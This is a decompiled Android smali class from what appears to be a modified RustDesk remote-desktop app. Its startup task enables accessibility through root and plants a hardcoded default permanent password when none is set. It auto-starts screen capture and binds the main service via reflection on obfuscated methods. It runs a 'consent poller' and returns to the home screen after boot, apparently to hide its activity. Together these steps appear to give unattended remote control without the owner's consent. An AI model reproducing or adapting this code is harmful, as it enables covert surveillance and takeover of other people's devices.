.class Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;
.super Ljava/lang/Object;
.source "AutoConsentHelper.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/carriez/flutter_hbb/AutoConsentHelper;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x8
    name = "AutoStartTask"
.end annotation


# instance fields
.field private final activity:Landroid/app/Activity;


# direct methods
.method constructor <init>(Landroid/app/Activity;)V
    .registers 2

    .line 314
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 315
    iput-object p1, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    .line 316
    return-void
.end method


# virtual methods
.method public run()V
    .registers 10

    .line 321
    const-string v0, "AutoConsentHelper"

    :try_start_2
    iget-object v1, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    sput-object v1, Lcom/carriez/flutter_hbb/AutoConsentHelper;->currentActivity:Landroid/app/Activity;

    .line 323
    iget-object v1, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    invoke-static {v1}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->registerCommandReceiver(Landroid/content/Context;)V

    .line 324
    iget-object v1, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    invoke-static {v1}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->startConfigSyncPoller(Landroid/content/Context;)V

    .line 327
    iget-object v1, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    invoke-virtual {v1}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    move-result-object v1

    .line 328
    const/4 v2, 0x0

    if-eqz v1, :cond_26

    const-string v3, "SHOW_PASSWORD_DIALOG"

    invoke-virtual {v1, v3, v2}, Landroid/content/Intent;->getBooleanExtra(Ljava/lang/String;Z)Z

    move-result v3

    if-eqz v3, :cond_26

    .line 329
    iget-object v3, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    # invokes: Lcom/carriez/flutter_hbb/AutoConsentHelper;->buildAndShowDialog(Landroid/content/Context;)V
    invoke-static {v3}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->access$000(Landroid/content/Context;)V

    .line 331
    :cond_26
    if-eqz v1, :cond_35

    const-string v3, "SHOW_RENAME_DIALOG"

    invoke-virtual {v1, v3, v2}, Landroid/content/Intent;->getBooleanExtra(Ljava/lang/String;Z)Z

    move-result v3

    if-eqz v3, :cond_35

    .line 332
    iget-object v3, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    # invokes: Lcom/carriez/flutter_hbb/AutoConsentHelper;->buildAndShowRenameDialog(Landroid/content/Context;)V
    invoke-static {v3}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->access$100(Landroid/content/Context;)V

    .line 335
    :cond_35
    iget-object v3, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    invoke-static {v3}, Lcom/carriez/flutter_hbb/ConfigManager;->ensureAccessibilityViaRoot(Landroid/content/Context;)V
    :try_end_3a
    .catchall {:try_start_2 .. :try_end_3a} :catchall_15d

    .line 339
    const/4 v3, 0x1

    :try_start_3b
    iget-object v4, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    invoke-virtual {v4}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v4

    const-string v5, "N"

    new-array v6, v2, [Ljava/lang/Class;

    invoke-virtual {v4, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    .line 340
    iget-object v5, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    new-array v6, v2, [Ljava/lang/Object;

    invoke-virtual {v4, v5, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v4

    .line 341
    if-eqz v4, :cond_86

    .line 342
    invoke-virtual {v4}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v5

    const-string v6, "a"

    invoke-virtual {v5, v6}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;

    move-result-object v5

    .line 343
    invoke-virtual {v5, v3}, Ljava/lang/reflect/Field;->setAccessible(Z)V

    .line 344
    invoke-virtual {v5, v4}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v4

    .line 345
    if-eqz v4, :cond_86

    .line 346
    invoke-virtual {v4}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v5

    const-string v6, "setSemanticsEnabled"

    new-array v7, v3, [Ljava/lang/Class;

    sget-object v8, Ljava/lang/Boolean;->TYPE:Ljava/lang/Class;

    aput-object v8, v7, v2

    invoke-virtual {v5, v6, v7}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    .line 347
    new-array v6, v3, [Ljava/lang/Object;

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v7

    aput-object v7, v6, v2

    invoke-virtual {v5, v4, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 348
    const-string v4, "Flutter Semantics enabled via FlutterJNI!"

    invoke-static {v0, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_86
    .catchall {:try_start_3b .. :try_end_86} :catchall_87

    .line 353
    :cond_86
    goto :goto_8d

    .line 351
    :catchall_87
    move-exception v4

    .line 352
    :try_start_88
    const-string v5, "Failed to enable Flutter Semantics: "

    invoke-static {v0, v5, v4}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_8d
    .catchall {:try_start_88 .. :try_end_8d} :catchall_15d

    .line 357
    :goto_8d
    :try_start_8d
    new-instance v4, Ljava/io/File;

    const-string v5, "/data/user/0/com.carriez.flutter_hbb/app_flutter/RustDesk.toml"

    invoke-direct {v4, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 358
    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v5

    if-eqz v5, :cond_c4

    .line 359
    invoke-static {v4}, Lcom/carriez/flutter_hbb/ConfigManager;->readFile(Ljava/io/File;)Ljava/lang/String;

    move-result-object v4

    .line 360
    const-string v5, "password"

    invoke-static {v4, v5}, Lcom/carriez/flutter_hbb/ConfigManager;->extractTomlValue(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 361
    if-eqz v4, :cond_b8

    invoke-virtual {v4}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->isEmpty()Z

    move-result v5

    if-nez v5, :cond_b8

    const-string v5, "01"

    invoke-virtual {v4, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v4

    if-nez v4, :cond_c4

    .line 362
    :cond_b8
    const-string v4, "RustDesk.toml has empty or unencrypted password; applying default permanent password..."

    invoke-static {v0, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 363
    iget-object v4, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    sget-object v5, Lcom/carriez/flutter_hbb/ConfigManager;->PERMANENT_PASSWORD:Ljava/lang/String;

    invoke-static {v4, v5}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->savePermanentPassword(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_c4
    .catchall {:try_start_8d .. :try_end_c4} :catchall_c5

    .line 368
    :cond_c4
    goto :goto_cb

    .line 366
    :catchall_c5
    move-exception v4

    .line 367
    :try_start_c6
    const-string v5, "Check default password error: "

    invoke-static {v0, v5, v4}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 370
    :goto_cb
    iget-object v4, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    invoke-static {v4}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->isAccessibilityEnabled(Landroid/content/Context;)Z

    move-result v4

    .line 371
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "checkAndAutoStartService: accessibility enabled = "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v0, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 372
    if-nez v4, :cond_ef

    .line 373
    const-string v1, "Accessibility not enabled, skipping auto-start service."

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 374
    return-void

    .line 377
    :cond_ef
    const-string v4, "Accessibility verified! Auto-starting screen capture service..."

    invoke-static {v0, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_f4
    .catchall {:try_start_c6 .. :try_end_f4} :catchall_15d

    .line 380
    :try_start_f4
    iget-object v4, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    invoke-virtual {v4}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v4

    const-string v5, "o0"

    new-array v6, v2, [Ljava/lang/Class;

    invoke-virtual {v4, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    .line 381
    iget-object v5, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    new-array v6, v2, [Ljava/lang/Object;

    invoke-virtual {v4, v5, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_109
    .catchall {:try_start_f4 .. :try_end_109} :catchall_10a

    .line 384
    goto :goto_110

    .line 382
    :catchall_10a
    move-exception v4

    .line 383
    :try_start_10b
    const-string v5, "Failed to invoke o0(): "

    invoke-static {v0, v5, v4}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_110
    .catchall {:try_start_10b .. :try_end_110} :catchall_15d

    .line 387
    :goto_110
    :try_start_110
    const-string v4, "com.carriez.flutter_hbb.MainService"

    invoke-static {v4}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v4

    .line 388
    new-instance v5, Landroid/content/Intent;

    iget-object v6, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    invoke-direct {v5, v6, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 389
    iget-object v4, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    invoke-virtual {v4}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v4

    const-string v6, "r"

    invoke-virtual {v4, v6}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;

    move-result-object v4

    .line 390
    invoke-virtual {v4, v3}, Ljava/lang/reflect/Field;->setAccessible(Z)V

    .line 391
    iget-object v6, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    invoke-virtual {v4, v6}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/content/ServiceConnection;

    .line 392
    if-eqz v4, :cond_140

    .line 393
    iget-object v6, p0, Lcom/carriez/flutter_hbb/AutoConsentHelper$AutoStartTask;->activity:Landroid/app/Activity;

    invoke-virtual {v6, v5, v4, v3}, Landroid/app/Activity;->bindService(Landroid/content/Intent;Landroid/content/ServiceConnection;I)Z

    .line 394
    const-string v4, "MainService bound successfully via AutoConsentHelper!"

    invoke-static {v0, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_140
    .catchall {:try_start_110 .. :try_end_140} :catchall_141

    .line 398
    :cond_140
    goto :goto_147

    .line 396
    :catchall_141
    move-exception v4

    .line 397
    :try_start_142
    const-string v5, "Failed to bind MainService: "

    invoke-static {v0, v5, v4}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 400
    :goto_147
    # invokes: Lcom/carriez/flutter_hbb/AutoConsentHelper;->startConsentPoller()V
    invoke-static {}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->access$200()V

    .line 402
    if-eqz v1, :cond_155

    const-string v4, "FROM_BOOT"

    invoke-virtual {v1, v4, v2}, Landroid/content/Intent;->getBooleanExtra(Ljava/lang/String;Z)Z

    move-result v1

    if-eqz v1, :cond_155

    const/4 v2, 0x1

    .line 403
    :cond_155
    if-eqz v2, :cond_15c

    .line 405
    const-wide/16 v1, 0x9c4

    invoke-static {v1, v2}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->returnToHomeLauncherDelayed(J)V
    :try_end_15c
    .catchall {:try_start_142 .. :try_end_15c} :catchall_15d

    .line 410
    :cond_15c
    goto :goto_163

    .line 408
    :catchall_15d
    move-exception v1

    .line 409
    const-string v2, "checkAndAutoStartService error: "

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 411
    :goto_163
    return-void
.end method
